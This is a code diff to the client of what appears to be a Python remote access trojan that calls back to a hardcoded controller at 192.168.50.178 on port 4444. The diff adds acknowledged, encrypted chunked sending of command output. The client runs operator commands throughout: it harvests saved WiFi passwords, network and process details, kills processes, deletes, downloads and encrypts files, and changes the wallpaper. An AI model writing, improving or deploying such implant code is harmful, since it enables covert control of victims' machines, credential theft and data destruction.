@@ -369,6 +369,18 @@ class ClientHandler:
         for chunk in chunks:
             self.send(chunk)
             time.sleep(0.1)
+    def send_with_ack(self, data: bytes):
+        encrypted = encrypt(data)
+        chunks = to_chunks(encrypted)
+        chunk_num = len(chunks)
+        self.send(encrypt(str(len(chunks)).encode()))
+        time.sleep(1)
+        for chunk in range(chunk_num):
+            self.send(chunks[chunk])
+            if self.recv().decode() == f"Chunk {chunk} received":
+                continue
+            else:
+                break
 
 
     def handle_commands(self,os_name):
@@ -385,7 +397,7 @@ class ClientHandler:
                         result = subprocess.run("dir", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("ls -ltrh", shell=True, capture_output=True, text=True).stdout
-                    self.send_data(result.encode())
+                    self.send_with_ack(result.encode())
 
                 elif cmd == "path":
                     if os_name=="Windows":
@@ -393,39 +405,39 @@ class ClientHandler:
                         self.send_data(current.encode())
                     else:
                         result = subprocess.run("pwd", shell=True, capture_output=True, text=True).stdout
-                        self.send_data(result.encode())
+                        self.send_with_ack(result.encode())
 
                 elif cmd == "ipconfig":
                     if os_name=="Windows":
                         result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("ip a", shell=True, capture_output=True, text=True).stdout
-                    self.send_data(result.encode())
+                    self.send_with_ack(result.encode())
 
                 elif cmd == "arp -a":
                     result = subprocess.run("arp -a", shell=True, capture_output=True, text=True).stdout
-                    self.send_data(result.encode())
+                    self.send_with_ack(result.encode())
                 
                 elif cmd == "wifi-networks":
                     if os_name=="Windows":
                         result = subprocess.run("netsh wlan show profile", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = "Still unavailable on linux"
-                    self.send_data(result.encode())
+                    self.send_with_ack(result.encode())
                 
                 elif cmd == "hostname":
                     if os_name=="Windows":
                         result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("hostnamectl", shell=True, capture_output=True, text=True).stdout
-                    self.send_data(result.encode())
+                    self.send_with_ack(result.encode())
                 
                 elif cmd == "ps":
                     if os_name=="Windows":
                         result = subprocess.run("tasklist /v", shell=True, capture_output=True, text=True).stdout
                     else:
                         result = subprocess.run("ps aux", shell=True, capture_output=True, text=True).stdout
-                    self.send_data(result.encode())
+                    self.send_with_ack(result.encode())
                 
                 elif cmd.startswith("kill "):
                     try:
@@ -452,6 +464,7 @@ class ClientHandler:
                     except Exception as e:
                         self.send(encrypt(b"1"))
                         self.send(encrypt(f"Error killing process: {str(e)}".encode()))
+                    self.recv()
                 
                 elif cmd == "system":
                     try:
@@ -516,6 +529,7 @@ class ClientHandler:
                     except Exception as e:
                         self.send(encrypt(b"1"))
                         self.send(encrypt(f"Error getting system info: {str(e)}".encode()))
+                    self.recv()
                 
                 elif cmd.startswith("wifi-password "):
                     wifi_network = cmd.split(" ",1)[1]
@@ -530,7 +544,7 @@ class ClientHandler:
                                 result = f"No password found for network: {wifi_network}"
                         except:
                             result = "Failed to retrieve WiFi password. May need sudo privileges."
-                    self.send_data(result.encode())                    
+                    self.send_with_ack(result.encode())                    
 
                 elif cmd.startswith("del "):
                     filename = cmd.split(" ", 1)[1]
@@ -542,14 +556,15 @@ class ClientHandler:
 
                 elif cmd.startswith("cd "):
                     directory = cmd.split(" ", 1)[1]
+                    self.send(encrypt(b"1"))
                     try:
                         os.chdir(directory)
                         current = os.path.abspath(os.getcwd())
-                        self.send(encrypt(b"1"))
                         time.sleep(0.5)
                         self.send(encrypt(f"Changed to {current}".encode()))
                     except:
                         self.send(encrypt(b"Directory change failed"))
+                    self.recv()
 
                 elif cmd.startswith("download "):
                     file_name = decrypt(self.recv()).decode()
@@ -581,6 +596,7 @@ class ClientHandler:
                         except Exception as e:
                             self.send(encrypt(b"1"))
                             self.send(encrypt(f"Failed to change wallpaper: {str(e)}".encode()))
+                    self.recv()
                 
                 elif cmd.startswith("encrypt "):
                     file_name = decrypt(self.recv()).decode()
@@ -593,9 +609,12 @@ class ClientHandler:
                 else:
                     self.send(encrypt(b"1"))
                     self.send(encrypt(b"Unknown command"))
+                    self.recv()
 
             except Exception as e:
+                self.send(b'1')
                 self.send(encrypt(f"Error: {e}".encode()))
+                self.recv()
                 print(f"[Error] {e}")
                 break
 
@@ -608,7 +627,7 @@ def Connect_to_server():
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             while 1:
                 try:
-                    sock.connect(("192.168.50.200",4444))
+                    sock.connect(("192.168.50.178",4444))
                     print("[*] Connected to server ...    ")
                     time.sleep(1)
                     sock.sendall(key)
